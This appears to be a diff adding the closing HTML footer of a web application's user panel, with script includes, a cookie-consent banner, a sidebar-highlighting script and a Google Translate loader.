+<!----Translator-->
+<div id="google_translate_element" style="bottom:42px" data-translator-bt=""></div>
+<!----OTHER NOTIFIERS---->
+<label id="wait">Processing...</label>
+<div class="rstrt"><i class="bi bi-x-circle"></i>&nbsp;<div class="___echo">Not Allowed</div></div>
+
+
+
+<script src='/users/assets/js/lib/bootstrap.bundle.min.js'></script>
+
+<script src='/users/assets/js/plugins/splide/splide.min.js'></script>
+
+<script src='/users/assets/js/base.js'></script>
+
+
+<script src="/users/assets/js/AppMain.js"></script>
+<script src="/js/alertify/alertify.min.js"></script>
+<script src="/js/offline/offline.min.js"></script>
+<script src="/js/panel.js"></script>
+<script src="/js/base.js"></script>
+   
+<script src="/js/typo.js"></script>
+<script src="/js/a_GenImage.js"></script>
+
+    
+<script id='cCdl'>$(window).on('load',function(){$('body').append($('<script />',{src:'/js/wbf.js?intbit=1'}))});</script>
+
+
+
+<div class="wrpr drk"><div><header class="tHdr"><img src="data:image/svg+xml;utf8,<?xml version='1.0' encoding='UTF-8'?><svg version='1.1' id='Layer_1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x='0px' y='0px' viewBox='0 0 120.23 122.88' style='enable-background:new 0 0 120.23 122.88' xml:space='preserve'><g><path style='fill:white;fill-rule:evenodd;clip-rule:evenodd' d='M98.18,0c3.3,0,5.98,2.68,5.98,5.98c0,3.3-2.68,5.98-5.98,5.98c-3.3,0-5.98-2.68-5.98-5.98 C92.21,2.68,94.88,0,98.18,0L98.18,0z M99.78,52.08c5.16,7.7,11.69,10.06,20.17,4.85c0.28,2.9,0.35,5.86,0.2,8.86 c-1.67,33.16-29.9,58.69-63.06,57.02C23.94,121.13-1.59,92.9,0.08,59.75C1.74,26.59,30.95,0.78,64.1,2.45 c-2.94,9.2-0.45,17.37,7.03,20.15C64.35,44.38,79.49,58.63,99.78,52.08L99.78,52.08z M30.03,47.79c4.97,0,8.99,4.03,8.99,8.99 s-4.03,8.99-8.99,8.99c-4.97,0-8.99-4.03-8.99-8.99S25.07,47.79,30.03,47.79L30.03,47.79z M58.35,59.25c2.86,0,5.18,2.32,5.18,5.18 c0,2.86-2.32,5.18-5.18,5.18c-2.86,0-5.18-2.32-5.18-5.18C53.16,61.57,55.48,59.25,58.35,59.25L58.35,59.25z M35.87,80.59 c3.49,0,6.32,2.83,6.32,6.32c0,3.49-2.83,6.32-6.32,6.32c-3.49,0-6.32-2.83-6.32-6.32C29.55,83.41,32.38,80.59,35.87,80.59 L35.87,80.59z M49.49,32.23c2.74,0,4.95,2.22,4.95,4.95c0,2.74-2.22,4.95-4.95,4.95c-2.74,0-4.95-2.22-4.95-4.95 C44.54,34.45,46.76,32.23,49.49,32.23L49.49,32.23z M76.39,82.8c4.59,0,8.3,3.72,8.3,8.3c0,4.59-3.72,8.3-8.30,8.3 c-4.59,0-8.3-3.72-8.3-8.3C68.09,86.52,71.81,82.8,76.39,82.8L76.39,82.8z M93.87,23.1c3.08,0,5.58,2.5,5.58,5.58 c0,3.08-2.5,5.58-5.58,5.58s-5.58-2.5-5.58-5.58C88.29,25.6,90.79,23.1,93.87,23.1L93.87,23.1z'/></g></svg>"/></header><div class="fcDtr"><p>This website use cookies to help you have a superior and more relevant browsing experience on the website. <a href="javascript:void(0);"> Read more...</a></p></div><div class="tBtns"><button type="button" class="tBtn">Accept</button></div></div></div><style>.wrpr,.wrpr *{box-sizing:border-box;font-family:'Asap',sans-serif}.wrpr{max-width:345px;width:100%;background:#e1e1e1;color:#333;border-radius:8px;padding:15px 25px 22px;transition:right 0.3s ease;box-shadow:0 5px 10px rgba(0,0,0,.1);z-index:100000000;display:none;justify-content:center;align-items:center;position:fixed;bottom:20px;left:50%;transform:translateX(-50%)}.wrpr.drk{background-color:#222;color:#fff}.wrpr.shw{display:flex}.wrpr .tHdr{display:flex;align-items:center;column-gap:15px}.tHdr i{color:var(--AppColor);font-size:32px}.wrpr .fcDtr{margin-top:16px;font-size:16px}.fcDtr p a{color:var(--AppColor);text-decoration:none}.fcDtr p a:hover{text-decoration:underline}.wrpr .tBtns{margin-top:16px;width:100%;display:flex;align-items:center;justify-content:space-between}.tBtn{height:auto;border:none;color:#fff;padding:8px 0;border-radius:4px;background:var(--AppColor);cursor:pointer;width:100%;transition:all .2s ease}.tHdr img{margin:0 auto;background:var(--AppColor);border-radius:50%;padding:5px;height:2.5rem;width:2.5rem}@media only screen and (min-width:768px){.wrpr{bottom:20px;right:20px;left:unset;transform:none}}</style><script>$(function(){if(!document.cookie.includes('dAllowed')){$('.wrpr').addClass('shw');$(document).on('click','.tBtn',function(){$('.wrpr').removeClass('shw');document.cookie='cookieBy=dAllowed; max-age='+(60*60*24*30)})}});</script>
+
+<script>$(document).ready(function(){var $u=window.location.pathname.replace(/\/$/,''),pgName=$u.substring($u.lastIndexOf('/')+1).toLowerCase();$(".sidebar-wrapper .menu .sidebar-item").filter(function(){return $(this).find("a[href]").filter(function(){return new RegExp(pgName,"i").test($(this).attr("href"))}).length>=1}).last().addClass("active")})</script>
+<script>function googleTranslateElementInit() { new google.translate.TranslateElement({ pageLanguage: 'en' }, 'google_translate_element') } $(window).on('load', function () { $.getScript({ url: 'https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit', cache: true }) });</script>
+</body>
+</html>
